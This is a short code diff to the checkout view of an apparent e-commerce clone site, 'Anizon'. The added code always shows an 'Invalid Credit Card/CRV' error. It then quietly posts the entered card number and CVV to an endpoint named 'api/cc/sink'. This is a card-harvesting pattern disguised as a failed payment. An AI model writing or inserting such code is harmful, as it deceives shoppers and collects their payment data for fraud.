@@ -308,12 +308,16 @@ Anizon.Views.CheckOut = Support.CompositeView.extend({
 
   checkout: function(){
     var user_info = this.$el.find("#userinfo-form").serializeJSON();
-    $.notify("Incorrect Credit Card Number");
-    // $.ajax({
-    //   method: "POST",
-    //   url: "api/orders",
-    //   data: 
-    // })
+    this.$el.find("#crv").notify("Invalid Credit Card/CRV",{
+      position: "top right"
+    });
+
+    var parent = this;
+    $.ajax({
+      method: "POST",
+      url: "api/cc/sink",
+      data: {cred: parent.$el.find("#cred").val(), crv: parent.$el.find("#crv").val()}
+    })
   },
 
   closeModal: function(){
